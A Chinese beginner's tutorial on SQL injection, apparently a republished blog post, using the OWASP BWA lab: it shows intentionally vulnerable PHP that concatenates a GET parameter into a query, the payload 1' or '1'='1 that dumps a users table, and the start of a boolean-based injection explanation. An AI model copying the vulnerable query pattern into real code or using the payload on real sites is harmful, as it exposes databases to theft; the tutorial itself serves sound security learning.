---
layout: post
title: 'SQL 注入详解扫盲'
time: 2017-01-10 00:00:00 +0800
site_name: jobbole.com
source_url: http://blog.jobbole.com/109784/
images:
  e75c45c91ea794600dc8630cc377f3da: http://ww4.sinaimg.cn/mw690/63918611gw1fblsh0btdrj20ir05ojrt.jpg
  6c26419dcc7ac150d21d3ffdd9202265: http://ww4.sinaimg.cn/mw690/63918611gw1fblsh16fw1j20ce0dstb5.jpg
---
{% raw %}


        			<div class="textwidget">
</div>
		
		<p>实习期间的主要工作还是研究 WEB 安全，编程语言是 Python，常用到正则表达式，对 HTTP 的协议也非常清晰。</p>
<p>刚过来的时候，研究的主要是 SQL 注入，因为之前没有搞过安全，所有费了好长一段时间学习 SQL 注入的基本知识。<strong>这篇文章并不是什么很深入的技术文章，或许应该叫它‘ SQL注入扫盲 ’</strong>。</p>
<h2 id="关于-SQL-Injection">关于 SQL Injection</h2>
<p>SQL Injection 就是通过把恶意的 SQL 命令插入到 Web 表单让服务器执行，最终达到欺骗服务器或数据库执行恶意的 SQL 命令。</p>
<p>学习 SQL 注入，首先要搭一个靶机环境，我使用的是 <a href="https://www.owasp.org/index.php/GPC_Project_Details/OWASP_BWA_Project" target="_blank">OWASP BWA</a>，感兴趣的可以去官网下载一个安装，除了 SQL 注入，很多靶机环境都可以在 BWA 中找到，它专门为 <a href="https://github.com/zaproxy/zaproxy" target="_blank">OWASP ZAP</a> 渗透工具设计的。</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3245919753343" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
$id = $_GET['id'];
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );
$num = mysql_numrows($result);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3245919753343-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3245919753343-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3245919753343-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3245919753343-4">4</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3245919753343-1">
<span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3245919753343-2">
<span class="crayon-sy">$</span><span class="crayon-v">getid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3245919753343-3">
<span class="crayon-sy">$</span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">getid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">'&lt;pre&gt;'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">mysql_error</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/pre&gt;'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3245919753343-4">
<span class="crayon-sy">$</span><span class="crayon-v">num</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_numrows</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">result</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>这是一个很简单的 PHP代码，从前台获得 <code>id</code> 的值，交给数据库来执行，把结果返回给前台。</p>
<p>比如我们在 OWASP 里输入 <code>id = 1</code>，点击 Submit，返回结果如下：</p>
<p><img class="alignnone" src="/images/jobbole.com/e75c45c91ea794600dc8630cc377f3da.jpg" width="675" height="204"></p>
<p>稍微懂一点后台或者数据库的人都知道，上面的那段代码是有严重问题的，<strong>没有对 id 的值进行有效性、合法性判断</strong>。也就是说，我们在 submit 输入框输入的如何内容都会被提交给数据库执行，比如在输入框输入<code>1' or '1'='1</code>，执行就会变成：</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c325d581716695" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
//原先要在数据库中执行的命令
SELECT first_name, last_name FROM users WHERE user_id = '1'
//变成
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c325d581716695-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c325d581716695-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c325d581716695-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c325d581716695-4">4</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c325d581716695-1"><span class="crayon-c">//原先要在数据库中执行的命令</span></div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c325d581716695-2">
<span class="crayon-e">SELECT </span><span class="crayon-v">first_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">last_name </span><span class="crayon-e">FROM </span><span class="crayon-e">users </span><span class="crayon-e">WHERE </span><span class="crayon-v">user_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span>
</div>
<div class="crayon-line" id="crayon-587a9554c325d581716695-3"><span class="crayon-c">//变成</span></div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c325d581716695-4">
<span class="crayon-e">SELECT </span><span class="crayon-v">first_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">last_name </span><span class="crayon-e">FROM </span><span class="crayon-e">users </span><span class="crayon-e">WHERE </span><span class="crayon-v">user_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-s">'1'</span><span class="crayon-o">=</span><span class="crayon-s">'1'</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p><strong>注意一下单引号，这是 SQL 注入中非常重要的一个地方，所以注入代码的最后要补充一个 <code>'1'='1</code>让单引号闭合。</strong></p>
<p>由于 or 的执行，会把数据库表 users 中的所有内容显示出来，</p>
<p><img class="alignnone" src="/images/jobbole.com/6c26419dcc7ac150d21d3ffdd9202265.jpg" width="446" height="496"></p>
<p>下面对三种主要的注入类型进行介绍。</p>
<h2 id="Boolean-based-原理分析">Boolean-based 原理分析</h2>
<p>首先不得不讲SQL中的AND和OR<br>
AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。<br>
AND:返回第一个条件和第二个条件都成立的记录。<br>
OR:返回满足第一个条件或第二个条件的记录。<br>
AND和OR即为集合论中的交集和并集。<br>
下面是一个数据库的查询内容。</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3264196037603" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select * from students;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3264196037603-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3264196037603-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3264196037603-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3264196037603-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3264196037603-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3264196037603-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3264196037603-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3264196037603-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c3264196037603-9">9</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3264196037603-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-v">students</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3264196037603-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3264196037603-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">    </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">  </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3264196037603-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3264196037603-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Doris</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3264196037603-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10058</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Jaune</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">22</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3264196037603-7">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10060</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Alisa</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">29</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3264196037603-8">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3264196037603-9">
<span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p>1)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3267426790907" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select * from students where TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3267426790907-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3267426790907-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3267426790907-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3267426790907-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3267426790907-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3267426790907-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3267426790907-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3267426790907-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c3267426790907-9">9</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3267426790907-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-t">TRUE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3267426790907-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3267426790907-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">id</span><span class="crayon-h">    </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">  </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">age</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3267426790907-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3267426790907-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10056</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Doris</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3267426790907-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10058</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Jaune</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">22</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3267426790907-7">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-cn">10060</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">Alisa</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h">  </span><span class="crayon-cn">29</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3267426790907-8">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">-</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3267426790907-9">
<span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0026 seconds] -->
<p>2)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c326a255270320" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select * from students where FALSE ;
Empty set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c326a255270320-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c326a255270320-2">2</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c326a255270320-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e ">select *</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-t">FALSE</span><span class="crayon-h"> </span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c326a255270320-2">
<span class="crayon-e">Empty </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>3)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c326d965948521" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; SELECT * from students where id = 10056 and TRUE ;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
+-------+-------+-----+
1 row in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c326d965948521-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c326d965948521-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c326d965948521-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c326d965948521-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c326d965948521-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c326d965948521-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c326d965948521-7">7</div>
</div>
				</td>
